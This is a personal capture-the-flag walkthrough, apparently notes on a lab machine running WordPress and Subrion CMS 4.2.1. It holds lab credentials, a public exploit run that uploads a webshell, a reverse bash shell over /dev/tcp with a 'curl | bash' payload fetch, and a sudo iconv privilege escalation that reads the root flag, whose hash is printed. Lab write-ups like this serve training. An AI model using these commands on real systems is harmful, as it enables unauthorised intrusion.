Has default apache page.

Gobuster reveals a wordpress page:
![[Pasted image 20240724042201.png]]

![[Pasted image 20240724042302.png]]

![[Pasted image 20240724042341.png]]

![[Pasted image 20240724042458.png]]


**Server: Apache/2.4.18 (Ubuntu)**

`/wp`

![[Pasted image 20240724043855.png]]

![[Pasted image 20240724044022.png]]

![[Pasted image 20240724044510.png]]

![[Pasted image 20240724045040.png]]

![[Pasted image 20240724045056.png]]

![[Pasted image 20240724051506.png]]

![[Pasted image 20240724054615.png]]

![[Pasted image 20240724054842.png]]

![[Pasted image 20240724055134.png]]

---


```php
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

![[Pasted image 20240724055334.png]]

**Scam2021**

---

![[Pasted image 20240724055818.png]]

![[Pasted image 20240724061206.png]]

The ip address is inside the hyperlink `your dashboard`:

![[Pasted image 20240724061240.png]]

`/test`

![[Pasted image 20240724074455.png]]

![[Pasted image 20240724074923.png]]

![[Pasted image 20240724075039.png]]

`Subrion doesn't work, edit from admin panel`

![[Pasted image 20240724080628.png]]

![[Pasted image 20240724080843.png]]

**Subrion CMS v 4.2.1**   

![[Pasted image 20240724081233.png]]

Looks like it uploads a webshell that we can get RCE on the server with.

```php
python3 49876.py -u http://10.10.239.240/subrion/panel/ -l admin -p Scam2021
```

![[Pasted image 20240724082022.png]]


- Create reverse bash shell in nano

```php
bash -i >& /dev/tcp/<MY_IP>/4444 0>&1
```

- Start a httpserver

```php
python -m SimpleHTTPServer 80 
```

- Curl the file and pipe to bash

```php
curl <MY_IP>/<FILE> | bash
```

- This send me a rev shell

![[Pasted image 20240724084605.png]]

Possible User:
![[Pasted image 20240724085044.png]]

**PRIV ESC**

**L.E.S**

```php
Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS
```

![[Pasted image 20240724091548.png]]

Upgrade the shell:

```php
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
echo $TERM
stty raw -echo; fg ENTER ENTER
stty rows 30 columns 100
export TERM=xterm-256color
```

Ok, we only have 2 users on this machine: `root` user and the `scamsite` user. When we take a look at gobuster’s results we see there is a WordPress site – so let’s find `wp-config.php` file – there might be some credentials saved:

```php
find / -type f -name "wp-config.php" 2>/dev/null
```

![[Pasted image 20240724092000.png]]

![[Pasted image 20240724092133.png]]

Username:
scamsite

Password:
ImAScammerLOL!123!

**OS: Linux version 4.4.0-186-generic**

![[Pasted image 20240724095641.png]]

Use [GTFObins](https://gtfobins.github.io/gtfobins/iconv/#sudo) to find the way to exploit it:

![gtfobins sudo iconv](https://cdn.titus74.com/wp-content/uploads/2022/05/10115204/6f665b1d95f64106983fe4e743f30dfe.png)

Read the root flag:

```php
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

![[Pasted image 20240724095812.png]]

==851b8233a8c09400ec30651bd1529bf1ed02790b==

---

**Completed:** _09:58 2024-07-24_

